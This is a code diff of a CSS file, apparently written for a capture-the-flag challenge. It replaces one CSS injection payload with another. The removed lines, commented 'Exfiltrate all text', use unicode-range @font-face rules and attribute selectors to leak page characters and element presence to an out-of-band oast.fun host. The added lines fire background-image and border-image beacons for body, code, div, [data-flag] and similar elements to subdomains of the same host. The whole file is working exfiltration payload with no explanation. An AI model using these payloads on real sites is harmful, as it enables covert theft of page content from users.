@@ -1,23 +1,10 @@
-/* Exfiltrate all text via unicode-range font-face */
-@font-face { font-family: "x"; src: url("https://da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/css-I"); unicode-range: U+49; }
-@font-face { font-family: "x"; src: url("https://da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/css-N"); unicode-range: U+4E; }
-@font-face { font-family: "x"; src: url("https://da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/css-T"); unicode-range: U+54; }
-@font-face { font-family: "x"; src: url("https://da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/css-G"); unicode-range: U+47; }
-@font-face { font-family: "x"; src: url("https://da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/css-R"); unicode-range: U+52; }
-@font-face { font-family: "x"; src: url("https://da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/css-LBRACE"); unicode-range: U+7B; }
-@font-face { font-family: "x"; src: url("https://da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/css-RBRACE"); unicode-range: U+7D; }
-@font-face { font-family: "x"; src: url("https://da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/css-UNDER"); unicode-range: U+5F; }
-@font-face { font-family: "x"; src: url("https://da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/css-F"); unicode-range: U+46; }
-@font-face { font-family: "x"; src: url("https://da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/css-L"); unicode-range: U+4C; }
-@font-face { font-family: "x"; src: url("https://da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/css-A"); unicode-range: U+41; }
-@font-face { font-family: "x"; src: url("https://da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/css-X"); unicode-range: U+58; }
-@font-face { font-family: "x"; src: url("https://da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/css-flag"); unicode-range: U+66; }
-
-* { font-family: "x", sans-serif !important; }
-
-/* Also detect elements by tag/attribute */
-code { background: url("https://da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/has-code"); }
-[class] { background: url("https://da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/has-class"); }
-[id] { border-image: url("https://da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/has-id"); }
-[data-flag] { border-image: url("https://da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/has-data-flag"); }
-[hidden] { display:block !important; background: url("https://da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/has-hidden"); }
+body { background-image: url("http://csshit.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/body-bg") !important; }
+code { background-image: url("http://codeelem.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/code-bg") !important; }
+h1 { background-image: url("http://h1elem.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/h1-bg") !important; }
+p { background-image: url("http://pelem.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/p-bg") !important; }
+div { background-image: url("http://divelem.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/div-bg") !important; }
+main { background-image: url("http://mainelem.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/main-bg") !important; }
+[class] { border-image: url("http://hasclass.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/x") !important; }
+[id] { border-image: url("http://hasid.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/x") !important; }
+[data-flag] { border-image: url("http://dataflag.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/x") !important; }
+* { font-family: serif !important; }
